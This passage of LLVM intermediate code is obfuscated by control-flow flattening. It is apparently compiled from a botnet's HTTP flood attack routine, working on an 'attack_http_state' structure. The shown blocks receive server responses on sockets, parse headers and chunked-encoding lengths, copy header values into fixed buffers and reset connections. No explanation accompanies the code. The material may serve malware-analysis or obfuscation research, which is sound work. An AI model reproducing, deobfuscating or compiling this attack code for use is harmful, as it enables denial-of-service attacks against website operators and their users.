  %2202 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2201, i32 0, i32 0
  %2203 = load i32, i32* %2202, align 4
  %2204 = call i32 @close(i32 %2203)
  %2205 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2206 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2205, i32 0, i32 0
  store i32 -1, i32* %2206, align 4
  %2207 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2208 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2207, i32 0, i32 1
  store i8 0, i8* %2208, align 4
  store i32 -79504362, i32* %switchVar
  br label %loopEnd

; <label>:2209:                                   ; preds = %loopEntry
  store i32 -726301654, i32* %switchVar
  br label %loopEnd

; <label>:2210:                                   ; preds = %loopEntry
  %2211 = load i32, i32* %12, align 4
  %2212 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2213 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2212, i32 0, i32 17
  %2214 = load i32, i32* %2213, align 4
  %2215 = add nsw i32 %2214, %2211
  store i32 %2215, i32* %2213, align 4
  %2216 = load i32, i32* %27, align 4
  %2217 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2218 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2217, i32 0, i32 2
  store i32 %2216, i32* %2218, align 4
  store i32 -1746132042, i32* %switchVar
  br label %loopEnd

; <label>:2219:                                   ; preds = %loopEntry
  store i32 0, i32* %59, align 4
  %2220 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2221 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2220, i32 0, i32 14
  %2222 = load i32, i32* %2221, align 4
  %2223 = icmp sgt i32 %2222, 0
  %2224 = select i1 %2223, i32 796688276, i32 -1857307076
  store i32 %2224, i32* %switchVar
  br label %loopEnd

; <label>:2225:                                   ; preds = %loopEntry
  %2226 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2227 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2226, i32 0, i32 14
  %2228 = load i32, i32* %2227, align 4
  %2229 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2230 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2229, i32 0, i32 17
  %2231 = load i32, i32* %2230, align 4
  %2232 = icmp sgt i32 %2228, %2231
  %2233 = select i1 %2232, i32 -714082173, i32 -487071792
  store i32 %2233, i32* %switchVar
  br label %loopEnd

; <label>:2234:                                   ; preds = %loopEntry
  %2235 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2236 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2235, i32 0, i32 17
  %2237 = load i32, i32* %2236, align 4
  store i32 515340712, i32* %switchVar
  store i32 %2237, i32* %.reg2mem23
  br label %loopEnd

; <label>:2238:                                   ; preds = %loopEntry
  %2239 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2240 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2239, i32 0, i32 14
  %2241 = load i32, i32* %2240, align 4
  store i32 515340712, i32* %switchVar
  store i32 %2241, i32* %.reg2mem23
  br label %loopEnd

; <label>:2242:                                   ; preds = %loopEntry
  %.reload24 = load i32, i32* %.reg2mem23
  store i32 %.reload24, i32* %59, align 4
  %2243 = load i32, i32* %59, align 4
  %2244 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2245 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2244, i32 0, i32 14
  %2246 = load i32, i32* %2245, align 4
  %2247 = sub nsw i32 %2246, %2243
  store i32 %2247, i32* %2245, align 4
  %2248 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2249 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2248, i32 0, i32 11
  %2250 = load i32, i32* %2249, align 4
  %2251 = icmp eq i32 %2250, 1
  %2252 = select i1 %2251, i32 -1001317966, i32 1119460215
  store i32 %2252, i32* %switchVar
  br label %loopEnd

; <label>:2253:                                   ; preds = %loopEntry
  %2254 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2255 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2254, i32 0, i32 18
  %2256 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2255, i32 0, i32 0
  %2257 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2258 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2257, i32 0, i32 17
  %2259 = load i32, i32* %2258, align 4
  %2260 = call i8* @table_retrieve_val(i32 52, i32* null)
  %2261 = call i32 @util_memsearch(i8* %2256, i32 %2259, i8* %2260, i32 11)
  %2262 = icmp ne i32 %2261, -1
  %2263 = select i1 %2262, i32 1841573069, i32 688105166
  store i32 %2263, i32* %switchVar
  br label %loopEnd

; <label>:2264:                                   ; preds = %loopEntry
  %2265 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2266 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2265, i32 0, i32 18
  %2267 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2266, i32 0, i32 0
  %2268 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2269 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2268, i32 0, i32 17
  %2270 = load i32, i32* %2269, align 4
  %2271 = call i8* @table_retrieve_val(i32 52, i32* null)
  %2272 = call i32 @util_memsearch(i8* %2267, i32 %2270, i8* %2271, i32 11)
  store i32 %2272, i32* %60, align 4
  %2273 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2274 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2273, i32 0, i32 18
  %2275 = load i32, i32* %60, align 4
  %2276 = sext i32 %2275 to i64
  %2277 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2274, i64 0, i64 %2276
  %2278 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2279 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2278, i32 0, i32 17
  %2280 = load i32, i32* %2279, align 4
  %2281 = load i32, i32* %60, align 4
  %2282 = sub nsw i32 %2280, %2281
  %2283 = call i32 @util_memsearch(i8* %2277, i32 %2282, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2283, i32* %61, align 4
  %2284 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2285 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2284, i32 0, i32 18
  %2286 = load i32, i32* %60, align 4
  %2287 = load i32, i32* %61, align 4
  %2288 = sub nsw i32 %2287, 1
  %2289 = add nsw i32 %2286, %2288
  %2290 = sext i32 %2289 to i64
  %2291 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2285, i64 0, i64 %2290
  store i8 0, i8* %2291, align 1
  %2292 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2293 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2292, i32 0, i32 15
  %2294 = load i32, i32* %2293, align 4
  %2295 = icmp slt i32 %2294, 5
  %2296 = select i1 %2295, i32 2092779269, i32 -1377008516
  store i32 %2296, i32* %switchVar
  br label %loopEnd

; <label>:2297:                                   ; preds = %loopEntry
  %2298 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2299 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2298, i32 0, i32 18
  %2300 = load i32, i32* %60, align 4
  %2301 = sext i32 %2300 to i64
  %2302 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2299, i64 0, i64 %2301
  %2303 = call i32 @util_strlen(i8* %2302)
  %2304 = icmp slt i32 %2303, 128
  %2305 = select i1 %2304, i32 149945825, i32 -1377008516
  store i32 %2305, i32* %switchVar
  br label %loopEnd

; <label>:2306:                                   ; preds = %loopEntry
  %2307 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2308 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2307, i32 0, i32 16
  %2309 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2310 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2309, i32 0, i32 15
  %2311 = load i32, i32* %2310, align 4
  %2312 = sext i32 %2311 to i64
  %2313 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2308, i64 0, i64 %2312
  %2314 = getelementptr inbounds [128 x i8], [128 x i8]* %2313, i32 0, i32 0
  %2315 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2316 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2315, i32 0, i32 18
  %2317 = load i32, i32* %60, align 4
  %2318 = sext i32 %2317 to i64
  %2319 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2316, i64 0, i64 %2318
  %2320 = call i32 @util_strcpy(i8* %2314, i8* %2319)
  %2321 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2322 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2321, i32 0, i32 16
  %2323 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2323, i32 0, i32 15
  %2325 = load i32, i32* %2324, align 4
  %2326 = sext i32 %2325 to i64
  %2327 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2322, i64 0, i64 %2326
  %2328 = getelementptr inbounds [128 x i8], [128 x i8]* %2327, i32 0, i32 0
  %2329 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2330 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2329, i32 0, i32 16
  %2331 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2331, i32 0, i32 15
  %2333 = load i32, i32* %2332, align 4
  %2334 = sext i32 %2333 to i64
  %2335 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2330, i64 0, i64 %2334
  %2336 = getelementptr inbounds [128 x i8], [128 x i8]* %2335, i32 0, i32 0
  %2337 = call i32 @util_strlen(i8* %2336)
  %2338 = sext i32 %2337 to i64
  %2339 = getelementptr inbounds i8, i8* %2328, i64 %2338
  %2340 = call i32 @util_strcpy(i8* %2339, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %2341 = load i32, i32* %61, align 4
  %2342 = add nsw i32 %2341, 3
  %2343 = load i32, i32* %60, align 4
  %2344 = add nsw i32 %2343, %2342
  store i32 %2344, i32* %60, align 4
  %2345 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2346 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2345, i32 0, i32 18
  %2347 = load i32, i32* %60, align 4
  %2348 = sext i32 %2347 to i64
  %2349 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2346, i64 0, i64 %2348
  %2350 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2350, i32 0, i32 17
  %2352 = load i32, i32* %2351, align 4
  %2353 = load i32, i32* %60, align 4
  %2354 = sub nsw i32 %2352, %2353
  %2355 = call i32 @util_memsearch(i8* %2349, i32 %2354, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2355, i32* %61, align 4
  %2356 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2357 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2356, i32 0, i32 18
  %2358 = load i32, i32* %60, align 4
  %2359 = load i32, i32* %61, align 4
  %2360 = sub nsw i32 %2359, 1
  %2361 = add nsw i32 %2358, %2360
  %2362 = sext i32 %2361 to i64
  %2363 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2357, i64 0, i64 %2362
  store i8 0, i8* %2363, align 1
  %2364 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2365 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2364, i32 0, i32 16
  %2366 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2367 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2366, i32 0, i32 15
  %2368 = load i32, i32* %2367, align 4
  %2369 = sext i32 %2368 to i64
  %2370 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2365, i64 0, i64 %2369
  %2371 = getelementptr inbounds [128 x i8], [128 x i8]* %2370, i32 0, i32 0
  %2372 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2373 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2372, i32 0, i32 16
  %2374 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2375 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2374, i32 0, i32 15
  %2376 = load i32, i32* %2375, align 4
  %2377 = sext i32 %2376 to i64
  %2378 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2373, i64 0, i64 %2377
  %2379 = getelementptr inbounds [128 x i8], [128 x i8]* %2378, i32 0, i32 0
  %2380 = call i32 @util_strlen(i8* %2379)
  %2381 = sext i32 %2380 to i64
  %2382 = getelementptr inbounds i8, i8* %2371, i64 %2381
  %2383 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2384 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2383, i32 0, i32 18
  %2385 = load i32, i32* %60, align 4
  %2386 = sext i32 %2385 to i64
  %2387 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2384, i64 0, i64 %2386
  %2388 = call i32 @util_strcpy(i8* %2382, i8* %2387)
  %2389 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2390 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2389, i32 0, i32 15
  %2391 = load i32, i32* %2390, align 4
  %2392 = add nsw i32 %2391, 1
  store i32 %2392, i32* %2390, align 4
  store i32 -1377008516, i32* %switchVar
  br label %loopEnd

; <label>:2393:                                   ; preds = %loopEntry
  %2394 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2395 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2394, i32 0, i32 14
  store i32 -1, i32* %2395, align 4
  %2396 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2397 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2396, i32 0, i32 1
  store i8 10, i8* %2397, align 4
  store i32 123137081, i32* %switchVar
  br label %loopEnd

; <label>:2398:                                   ; preds = %loopEntry
  store i32 1119460215, i32* %switchVar
  br label %loopEnd

; <label>:2399:                                   ; preds = %loopEntry
  store i32 -1857307076, i32* %switchVar
  br label %loopEnd

; <label>:2400:                                   ; preds = %loopEntry
  %2401 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2402 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2401, i32 0, i32 14
  %2403 = load i32, i32* %2402, align 4
  %2404 = icmp eq i32 %2403, 0
  %2405 = select i1 %2404, i32 -1429358002, i32 -1687880589
  store i32 %2405, i32* %switchVar
  br label %loopEnd

; <label>:2406:                                   ; preds = %loopEntry
  %2407 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2408 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2407, i32 0, i32 13
  %2409 = load i32, i32* %2408, align 4
  %2410 = icmp eq i32 %2409, 1
  %2411 = select i1 %2410, i32 1830716276, i32 -1783149299
  store i32 %2411, i32* %switchVar
  br label %loopEnd

; <label>:2412:                                   ; preds = %loopEntry
  %2413 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2414 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2413, i32 0, i32 18
  %2415 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2414, i32 0, i32 0
  %2416 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2417 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2416, i32 0, i32 17
  %2418 = load i32, i32* %2417, align 4
  %2419 = call i32 @util_memsearch(i8* %2415, i32 %2418, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %2420 = icmp ne i32 %2419, -1
  %2421 = select i1 %2420, i32 935819184, i32 -810546594
  store i32 %2421, i32* %switchVar
  br label %loopEnd

; <label>:2422:                                   ; preds = %loopEntry
  %2423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2423, i32 0, i32 18
  %2425 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2424, i32 0, i32 0
  %2426 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2427 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2426, i32 0, i32 17
  %2428 = load i32, i32* %2427, align 4
  %2429 = call i32 @util_memsearch(i8* %2425, i32 %2428, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2429, i32* %62, align 4
  %2430 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2430, i32 0, i32 18
  %2432 = load i32, i32* %62, align 4
  %2433 = sub nsw i32 %2432, 2
  %2434 = sext i32 %2433 to i64
  %2435 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2431, i64 0, i64 %2434
  store i8 0, i8* %2435, align 1
  %2436 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2437 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2436, i32 0, i32 18
  %2438 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2437, i32 0, i32 0
  %2439 = load i32, i32* %62, align 4
  %2440 = call i32 @util_memsearch(i8* %2438, i32 %2439, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2441 = icmp ne i32 %2440, -1
  %2442 = select i1 %2441, i32 337011209, i32 510982773
  store i32 %2442, i32* %switchVar
  br label %loopEnd

; <label>:2443:                                   ; preds = %loopEntry
  %2444 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2445 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2444, i32 0, i32 18
  %2446 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2447 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2446, i32 0, i32 18
  %2448 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2447, i32 0, i32 0
  %2449 = load i32, i32* %62, align 4
  %2450 = call i32 @util_memsearch(i8* %2448, i32 %2449, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2451 = sext i32 %2450 to i64
  %2452 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2445, i64 0, i64 %2451
  store i8 0, i8* %2452, align 1
  store i32 510982773, i32* %switchVar
  br label %loopEnd

; <label>:2453:                                   ; preds = %loopEntry
  %2454 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2455 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2454, i32 0, i32 18
  %2456 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2455, i32 0, i32 0
  %2457 = call i32 @util_atoi(i8* %2456, i32 16)
  store i32 %2457, i32* %63, align 4
  %2458 = load i32, i32* %63, align 4
  %2459 = icmp eq i32 %2458, 0
  %2460 = select i1 %2459, i32 1956271007, i32 -619776329
  store i32 %2460, i32* %switchVar
  br label %loopEnd

; <label>:2461:                                   ; preds = %loopEntry
  %2462 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2463 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2462, i32 0, i32 1
  store i8 1, i8* %2463, align 4
  store i32 123137081, i32* %switchVar
  br label %loopEnd

; <label>:2464:                                   ; preds = %loopEntry
  %2465 = load i32, i32* %63, align 4
  %2466 = add nsw i32 %2465, 2
  %2467 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2468 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2467, i32 0, i32 14
  store i32 %2466, i32* %2468, align 4
  %2469 = load i32, i32* %62, align 4
  store i32 %2469, i32* %59, align 4
  store i32 -810546594, i32* %switchVar
  br label %loopEnd

; <label>:2470:                                   ; preds = %loopEntry
  store i32 -1330735938, i32* %switchVar
  br label %loopEnd

; <label>:2471:                                   ; preds = %loopEntry
  %2472 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2473 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2472, i32 0, i32 17
  %2474 = load i32, i32* %2473, align 4
  %2475 = load i32, i32* %59, align 4
  %2476 = sub nsw i32 %2474, %2475
  %2477 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2478 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2477, i32 0, i32 14
  store i32 %2476, i32* %2478, align 4
  %2479 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2480 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2479, i32 0, i32 14
  %2481 = load i32, i32* %2480, align 4
  %2482 = icmp eq i32 %2481, 0
  %2483 = select i1 %2482, i32 1140671727, i32 -1985023134
  store i32 %2483, i32* %switchVar
  br label %loopEnd

; <label>:2484:                                   ; preds = %loopEntry
  %2485 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2486 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2485, i32 0, i32 1
  store i8 1, i8* %2486, align 4
  store i32 123137081, i32* %switchVar
  br label %loopEnd

; <label>:2487:                                   ; preds = %loopEntry
  store i32 -1330735938, i32* %switchVar
  br label %loopEnd

; <label>:2488:                                   ; preds = %loopEntry
  store i32 -1687880589, i32* %switchVar
  br label %loopEnd

; <label>:2489:                                   ; preds = %loopEntry
  %2490 = load i32, i32* %59, align 4
  %2491 = icmp eq i32 %2490, 0
  %2492 = select i1 %2491, i32 -1212029393, i32 -1111277901
  store i32 %2492, i32* %switchVar
  br label %loopEnd

; <label>:2493:                                   ; preds = %loopEntry
  store i32 123137081, i32* %switchVar
  br label %loopEnd

; <label>:2494:                                   ; preds = %loopEntry
  %2495 = load i32, i32* %59, align 4
  %2496 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2497 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2496, i32 0, i32 17
  %2498 = load i32, i32* %2497, align 4
  %2499 = sub nsw i32 %2498, %2495
  store i32 %2499, i32* %2497, align 4
  %2500 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2501 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2500, i32 0, i32 18
  %2502 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2501, i32 0, i32 0
  %2503 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2504 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2503, i32 0, i32 18
  %2505 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2504, i32 0, i32 0
  %2506 = load i32, i32* %59, align 4
  %2507 = sext i32 %2506 to i64
  %2508 = getelementptr inbounds i8, i8* %2505, i64 %2507
  %2509 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2510 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2509, i32 0, i32 17
  %2511 = load i32, i32* %2510, align 4
  %2512 = sext i32 %2511 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2502, i8* %2508, i64 %2512, i32 1, i1 false)
  %2513 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2514 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2513, i32 0, i32 18
  %2515 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2516 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2515, i32 0, i32 17
  %2517 = load i32, i32* %2516, align 4
  %2518 = sext i32 %2517 to i64
  %2519 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2514, i64 0, i64 %2518
  store i8 0, i8* %2519, align 1
  %2520 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2521 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2520, i32 0, i32 17
  %2522 = load i32, i32* %2521, align 4
  %2523 = icmp eq i32 %2522, 0
  %2524 = select i1 %2523, i32 -1753786616, i32 -635243065
  store i32 %2524, i32* %switchVar
  br label %loopEnd

; <label>:2525:                                   ; preds = %loopEntry
  store i32 123137081, i32* %switchVar
  br label %loopEnd

; <label>:2526:                                   ; preds = %loopEntry
  store i32 -1239045360, i32* %switchVar
  br label %loopEnd

; <label>:2527:                                   ; preds = %loopEntry
  store i32 -1746132042, i32* %switchVar
  br label %loopEnd

; <label>:2528:                                   ; preds = %loopEntry
  store i32 368647132, i32* %switchVar
  br label %loopEnd

; <label>:2529:                                   ; preds = %loopEntry
  store i32 -859888446, i32* %switchVar
  br label %loopEnd

; <label>:2530:                                   ; preds = %loopEntry
  %2531 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2532 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2531, i32 0, i32 1
  %2533 = load i8, i8* %2532, align 4
  %2534 = zext i8 %2533 to i32
  %2535 = icmp eq i32 %2534, 10
  %2536 = select i1 %2535, i32 -106721809, i32 -549944157
  store i32 %2536, i32* %switchVar
  br label %loopEnd

; <label>:2537:                                   ; preds = %loopEntry
  store i32 1009481657, i32* %switchVar
  br label %loopEnd

; <label>:2538:                                   ; preds = %loopEntry
  %2539 = call i32* @__errno_location() #7
  store i32 0, i32* %2539, align 4
  %2540 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2541 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2540, i32 0, i32 0
  %2542 = load i32, i32* %2541, align 4
  %2543 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2544 = call i64 @recv(i32 %2542, i8* %2543, i64 10240, i32 16384)
  %2545 = trunc i64 %2544 to i32
  store i32 %2545, i32* %12, align 4
  %2546 = load i32, i32* %12, align 4
  %2547 = icmp eq i32 %2546, 0
  %2548 = select i1 %2547, i32 1495337038, i32 -568895287
  store i32 %2548, i32* %switchVar
  br label %loopEnd

; <label>:2549:                                   ; preds = %loopEntry
  %2550 = call i32* @__errno_location() #7
  store i32 104, i32* %2550, align 4
  store i32 -1, i32* %12, align 4
  store i32 -568895287, i32* %switchVar
  br label %loopEnd

; <label>:2551:                                   ; preds = %loopEntry
  %2552 = load i32, i32* %12, align 4
  %2553 = icmp eq i32 %2552, -1
  %2554 = select i1 %2553, i32 -1030918469, i32 1130425240
  store i32 %2554, i32* %switchVar
  br label %loopEnd

; <label>:2555:                                   ; preds = %loopEntry
  %2556 = call i32* @__errno_location() #7
  %2557 = load i32, i32* %2556, align 4
  %2558 = icmp ne i32 %2557, 11
  %2559 = select i1 %2558, i32 -1815768319, i32 198473311
  store i32 %2559, i32* %switchVar
  br label %loopEnd

; <label>:2560:                                   ; preds = %loopEntry
  %2561 = call i32* @__errno_location() #7
  %2562 = load i32, i32* %2561, align 4
  %2563 = icmp ne i32 %2562, 11
  %2564 = select i1 %2563, i32 -809476616, i32 198473311
  store i32 %2564, i32* %switchVar
  br label %loopEnd

; <label>:2565:                                   ; preds = %loopEntry
  %2566 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2567 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2566, i32 0, i32 0
  %2568 = load i32, i32* %2567, align 4
  %2569 = call i32 @close(i32 %2568)
  %2570 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2571 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2570, i32 0, i32 0
  store i32 -1, i32* %2571, align 4
  %2572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2572, i32 0, i32 1
  store i8 0, i8* %2573, align 4
  store i32 198473311, i32* %switchVar
  br label %loopEnd

; <label>:2574:                                   ; preds = %loopEntry
  store i32 1289748546, i32* %switchVar
  br label %loopEnd

; <label>:2575:                                   ; preds = %loopEntry
  store i32 1009481657, i32* %switchVar
  br label %loopEnd

; <label>:2576:                                   ; preds = %loopEntry
  %2577 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2578 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2577, i32 0, i32 1
  %2579 = load i8, i8* %2578, align 4
  %2580 = zext i8 %2579 to i32
  %2581 = icmp ne i32 %2580, 0
  %2582 = select i1 %2581, i32 1458701809, i32 -1673706629
  store i32 %2582, i32* %switchVar
  br label %loopEnd

; <label>:2583:                                   ; preds = %loopEntry
  %2584 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2585 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2584, i32 0, i32 1
  store i8 1, i8* %2585, align 4
  store i32 -1673706629, i32* %switchVar
